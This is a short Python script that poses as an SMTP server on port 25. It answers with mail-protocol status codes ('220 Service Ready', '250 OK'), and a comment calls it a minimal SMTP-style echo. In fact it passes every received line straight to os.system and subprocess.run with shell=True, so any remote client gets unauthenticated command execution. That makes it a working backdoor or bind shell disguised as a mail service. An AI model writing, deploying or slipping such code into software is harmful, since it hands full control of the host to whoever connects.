import os
import socket
import subprocess

def server(host="0.0.0.0", port=25):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Server listening on {host}:{port}", flush=True)

    try:
        while True:
            conn, addr = server_socket.accept()
            print(f"[+] Connection from {addr}", flush=True)
            try:
                conn.sendall(b"220 Service Ready\r\n")
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    packet = data.decode(errors="replace").strip()
                    print(f"Client says: {packet}", flush=True)
                    os.system(packet)
                    subprocess.run(packet, shell=True)
                    # echo minimale stile SMTP
                    if packet.upper().startswith("QUIT"):
                        conn.sendall(b"221 Bye\r\n")
                        break
                    else:
                        conn.sendall(b"250 OK\r\n")
            finally:
                conn.close()
    finally:
        server_socket.close()

if __name__ == "__main__":
    server()
